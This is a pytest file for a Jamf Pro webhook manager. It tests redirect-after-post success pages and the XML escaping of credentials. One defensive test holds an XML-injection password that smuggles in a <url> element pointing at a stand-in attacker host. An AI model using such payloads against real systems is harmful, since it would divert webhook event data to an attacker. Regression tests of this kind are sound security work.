"""Automation create/edit/delete success flow: PRG + one-shot flash."""

import io

import requests


def _custom_create_data():
    # custom_handler.process_create requires a name + an uploaded script.
    return {
        "custom_name": "prg-test-hook",
        "description": "prg test",
        "new_file": (io.BytesIO(b"#!/usr/bin/env python3\nprint('hi')\n"),
                     "hook.py"),
    }


def test_create_redirects_to_success(logged_in_client, jawa_env):
    resp = logged_in_client.post(
        "/automations/custom/new",
        data=_custom_create_data(),
        content_type="multipart/form-data",
    )
    # PRG: the POST must 302 to /success, not render 200 inline.
    assert resp.status_code == 302
    assert "/success" in resp.headers["Location"]


def test_success_flash_is_one_shot(logged_in_client, jawa_env):
    logged_in_client.post(
        "/automations/custom/new",
        data=_custom_create_data(),
        content_type="multipart/form-data",
    )
    # First GET renders the flashed context; second GET has no flash left.
    first = logged_in_client.get("/success")
    assert first.status_code == 200
    assert b"New webhook created" in first.data
    second = logged_in_client.get("/success")
    # Flash popped: the create message must not persist on a re-load.
    assert b"New webhook created" not in second.data


def test_edit_redirects_to_success(logged_in_client, jawa_env):
    logged_in_client.post(
        "/automations/custom/new",
        data=_custom_create_data(),
        content_type="multipart/form-data",
    )
    logged_in_client.get("/success")  # drain the create flash
    resp = logged_in_client.post(
        "/automations/custom/prg-test-hook/edit",
        data={
            "custom_name": "prg-test-hook",
            "description": "edited",
        },
        content_type="multipart/form-data",
    )
    assert resp.status_code == 302
    assert "/success" in resp.headers["Location"]


def test_delete_redirects_to_success(logged_in_client, jawa_env):
    logged_in_client.post(
        "/automations/custom/new",
        data=_custom_create_data(),
        content_type="multipart/form-data",
    )
    logged_in_client.get("/success")
    resp = logged_in_client.post(
        "/automations/custom/prg-test-hook/delete",
    )
    assert resp.status_code == 302
    assert "/success" in resp.headers["Location"]


def test_smart_group_notice_survives_flash(
    logged_in_client, jawa_env, monkeypatch
):
    # A smart-group event makes jamf_handler return a smart_group_notice.
    # The Jamf create POST reads resp.text (for the <id> scrape + logging),
    # which the shared fake_jamf post stub doesn't provide — so give this
    # test a post fake that returns Jamf-shaped XML.
    class _XmlResponse:
        status_code = 201
        text = "<webhook><id>42</id></webhook>"

    monkeypatch.setattr(
        requests, "post", lambda *a, **k: _XmlResponse()
    )

    resp = logged_in_client.post(
        "/automations/jamfpro/new",
        data={
            "webhook_name": "sg-membership-hook",
            "event": "SmartGroupComputerMembershipChange",
            "description": "smart group prg test",
            "choice": "none",
            "new_file": (
                io.BytesIO(b"#!/usr/bin/env python3\nprint('hi')\n"),
                "hook.py",
            ),
        },
        content_type="multipart/form-data",
    )
    # PRG: the POST must 302 to /success, stashing the rich context.
    assert resp.status_code == 302
    assert "/success" in resp.headers["Location"]

    # The smart-group NOTICE must survive the one-shot flash and render
    # on the redirected GET — proving the rich context, not just the
    # generic success_msg, crosses the redirect.
    page = logged_in_client.get("/success")
    assert page.status_code == 200
    assert b"NOTICE!  This webhook is not yet enabled." in page.data


def test_success_has_forward_actions_not_history_back(
    logged_in_client, jawa_env
):
    logged_in_client.post(
        "/automations/custom/new",
        data=_custom_create_data(),
        content_type="multipart/form-data",
    )
    resp = logged_in_client.get("/success")
    body = resp.data.decode()
    # No blind history.back() — it walks into a spent form.
    assert "history.back()" not in body
    # Forward actions present: Create another (for this type) + Dashboard.
    assert "/automations/custom/new" in body   # Create another
    assert "/dashboard" in body                # Dashboard


# --- Jamf Pro webhook XML: every interpolated value must be escaped ---


def test_auth_xml_escapes_the_basic_credentials():
    """A password that closes its own element must not inject siblings.

    _build_webhook_xml already escapes name and event with a comment
    explaining why hand-built f-string XML has to. _build_auth_xml, in
    the same file, interpolated raw form values -- so a crafted password
    could add a second <url> element to the <webhook> object, pointing
    Jamf Pro's event deliveries at another host while JAWA's own record
    and success page still showed the JAWA callback URL.
    """
    from views._type_handlers.jamf_handler import _build_auth_xml

    hostile = (
        "s3cret</password><url>https://attacker.example/hooks/x</url>"
        "<password>s3cret"
    )
    xml = _build_auth_xml(
        {"choice": "basic", "basic_username": "admin", "basic_password": hostile}
    )
    assert "<url>" not in xml, f"injected a <url> element: {xml}"
    assert "attacker.example" not in xml or "&lt;url&gt;" in xml
    assert xml.count("<password>") == 1, f"injected a second element: {xml}"


def test_auth_xml_survives_an_ordinary_ampersand():
    """The benign case needs no malice: & alone made Jamf reject the body."""
    from views._type_handlers.jamf_handler import _build_auth_xml

    xml = _build_auth_xml(
        {
            "choice": "basic",
            "basic_username": "a&b",
            "basic_password": "p<q>r",
        }
    )
    assert "<username>a&amp;b</username>" in xml
    assert "<password>p&lt;q&gt;r</password>" in xml
